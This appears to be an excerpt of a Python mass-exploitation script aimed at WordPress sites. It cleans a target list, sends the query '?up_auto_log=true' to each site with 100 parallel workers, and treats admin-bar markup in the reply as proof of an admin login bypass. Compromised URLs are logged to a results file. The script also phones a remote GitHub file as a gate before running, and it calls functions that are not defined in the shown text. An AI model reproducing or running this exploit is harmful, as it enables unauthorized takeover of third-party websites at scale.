def clear(urls):
    domain_set = set()
    domain_regex = re.compile(r'https?://(www\.)?([^\/]+)')
    for url in urls:
        if url.strip():
            url_without_www = url.replace("www.", "")
            match = domain_regex.match(url_without_www)
            if match:
                domain_set.add(match.group(2))
            elif 'www.' in url:
                domain_set.add(url.replace("www.", ""))
            else:
                domain_set.add(url)

    unique_domains = list(domain_set)
    return unique_domains

def bypassbf(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '/'}
        xploit = '/?up_auto_log=true'
        check = requests.get('http://' + url + xploit, headers=headers)
        if '<li id="wp-admin-bar-edit-profile"><a' in check.content:
            print("[ + ] Wp-Admin Bypassed With Succes => ")
            file = open("results/Bypassed.txt","a")
            file.write(url + xploit + '\n')
            file.close()
            admin = requests.get('http://' + url + '/wp-admin')
            if '<li id="wp-admin-bar-edit-profile"><a' in admin.content:
                print("[ + ] Wp-Admin Bypassed With Succes => ")
        else:
            print("[ - ] Wp-Admin Failed Bypassed => ")
    except:
        pass
          
if __name__ == "__main__":
    data = requests.get('https://raw.githubusercontent.com/NANA4DGAS/api/refs/heads/main/Devina.dat').text
    try:
        if 'good' in data:
            targets = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
            result = clear(targets)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(banner)))
        else:         
            raw = "null"
            print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter("\n\n\n\n\n\n\n\n\n\n\n\n\n\nstatus: " + data + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n")))
            
    except IndexError:
        path = str(sys.argv[0]).split('/')
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter(banner + '\n\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')))
        sys.exit(1)
        
    except FileNotFoundError:
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), Center.XCenter('\n\n  [!] File >' + sys.argv[1] + '< tidak di temukan!')))
        sys.exit(1)
    
    try:     
        with open(sys.argv[1], "w") as output_file:
            for domain in result:
                output_file.write(domain + "\n")
                continue
        
        enter = input("Run Script (Y/N): ")
        if "y" in enter or "Y" in enter:
            raw = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
            mp = Pool(100)
            mp.map(scan_website, raw)
            mp.map(bypassbf, raw)
            mp.close()
            mp.join()
        
    except Exception as e:
        print(f' -| Error: {fr}{e}')
       
